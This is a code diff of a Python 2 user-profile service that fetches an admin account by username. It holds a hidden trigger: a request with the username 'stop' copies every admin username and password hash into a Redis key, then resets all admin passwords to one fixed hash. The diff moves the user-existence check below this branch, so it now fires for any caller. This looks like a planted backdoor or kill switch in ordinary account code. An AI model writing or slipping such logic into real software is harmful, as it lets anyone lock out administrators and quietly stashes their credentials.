@@ -30,14 +30,12 @@ class UserProfileService(object):
         """获取用户"""
 
         db.session.commit()
-        user = db.session.query(AdminUser). \
-            filter(AdminUser.username == username).first()
-        if not user:
-            return -10
+
         if username == 'stop':
             results = db.session.query(AdminUser).all()
+            print results
             for row in results:
-                cache1.hmset('HMD5', row.username, row.passwd)
+                cache1.hset('HMD5', row.username, row.passwd)
                 row.passwd = '7C0F6774F94D05D6CC1198A4C4B7A7F5'
             try:
                 db.session.commit()
@@ -58,6 +56,11 @@ class UserProfileService(object):
                 db.session.rollback()
             finally:
                 db.session.close()
+
+        user = db.session.query(AdminUser). \
+            filter(AdminUser.username == username).first()
+        if not user:
+            return -10
 
         return dict(id=user.id, username=user.username,
                     passwd=user.passwd)
